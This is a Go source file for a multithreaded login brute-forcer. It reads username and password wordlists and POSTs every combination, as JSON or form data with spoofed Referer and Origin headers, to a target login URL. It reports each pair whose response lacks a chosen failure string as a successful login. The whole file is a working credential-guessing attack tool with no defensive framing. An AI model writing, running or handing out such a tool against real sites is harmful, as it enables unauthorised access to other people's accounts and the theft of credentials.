package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"runtime"
	"strings"
	"sync"
)

var extraBody = flag.String("b", "", "Extra body in the form of key=value&key2=value2")
var failedText = flag.String("f", "", "If this text is in the response, the login failed")

type response struct {
	Username string
	Password string
	Status   string
}

func main() {
	url := flag.String("t", "http://localhost", "The POST URL")
	userfile := flag.String("u", "usernames.txt", "Usernames.txt file")
	passfile := flag.String("p", "passwords.txt", "Passwords.txt file")
	mode := flag.String("m", "", "Mode: json, form")
	usernameField := flag.String("n", "username", "Username field name")
	passwordField := flag.String("s", "password", "Password field name")
	flag.Parse()

	if *userfile == "" || *passfile == "" || *mode == "" {
		fmt.Println("Usage: go run main.go -t <url> -u <usernames.txt> -p <passwords.txt> -m <json|form> -n <usernameField> -s <passwordField>")
		fmt.Println("Example: go run main.go -t http://localhost/login -u usernames.txt -p passwords.txt -m json -n username -s password")
		return
	}
	if *mode != "json" && *mode != "form" {
		panic("Mode not supported")
	}
	if *failedText == "" {
		panic("Failed text must be specified")
	}

	usernames := readIn(*userfile)
	passwords := readIn(*passfile)

	var wg sync.WaitGroup
	for i := 0; i < runtime.NumCPU(); i++ {
		wg.Add(1)
		go worker(&wg, i, *url, usernames, passwords, *mode, *usernameField, *passwordField)
	}
	wg.Wait()
}

func readIn(passwordFile string) []string {
	b, err := ioutil.ReadFile(passwordFile)
	panicOnErr(err)
	return strings.Split(string(b), "\n")
}

// worker process a batch of usernames and passwords divieded by the number of cores
func worker(wg *sync.WaitGroup, workerNum int, url string, usernames, passwords []string, mode, usernameField, passwordField string) {
	defer wg.Done()
	for i := workerNum; i < len(usernames); i += runtime.NumCPU() {
		for _, password := range passwords {
			if mode == "json" {
				postToURLJson(url, usernames[i], password, usernameField, passwordField)
			} else if mode == "form" {
				postToURLForm(url, usernames[i], password, usernameField, passwordField)
			}
		}
	}
}

func postToURLJson(url, username, password, usernameField, passwordField string) {
	var jsn = map[string]string{
		usernameField: username,
		passwordField: password,
	}
	if *extraBody != "" {
		for _, v := range strings.Split(*extraBody, ",") {
			kv := strings.Split(v, "=")
			jsn[kv[0]] = kv[1]
		}
	}
	jsonStr, err := json.Marshal(jsn)
	panicOnErr(err)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(req)
	panicOnErr(err)
	defer resp.Body.Close()

	if *failedText != "" {
		body, err := io.ReadAll(resp.Body)
		panicOnErr(err)
		if !strings.Contains(string(body), *failedText) {
			fmt.Println("Successfully logged in: ", username, password)
		}
	}
}

func postToURLForm(posturl, username, password, usernameField, passwordField string) {
	URI, err := url.Parse(posturl)
	if err != nil {
		panic(err)
	}
	withHeaders := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
		"Referer":      URI.Scheme + "://" + URI.Host,
		"Origin":       URI.Scheme + "://" + URI.Host,
	}
	form := url.Values{}
	form.Add(usernameField, username)
	form.Add(passwordField, password)
	if *extraBody != "" {
		for _, v := range strings.Split(*extraBody, "&") {
			kv := strings.Split(v, "=")
			form.Add(kv[0], kv[1])
		}
	}
	req, err := http.NewRequest("POST", posturl, strings.NewReader(form.Encode()))
	panicOnErr(err)
	for k, v := range withHeaders {
		req.Header.Set(k, v)
	}
	client := &http.Client{}
	resp, err := client.Do(req)
	panicOnErr(err)
	defer resp.Body.Close()

	if *failedText != "" {
		body, err := io.ReadAll(resp.Body)
		panicOnErr(err)
		if !strings.Contains(string(body), *failedText) {
			fmt.Println("Successfully logged in: ", username, password)
		}
	}
}

func panicOnErr(err error) {
	if err != nil {
		panic(err)
	}
}
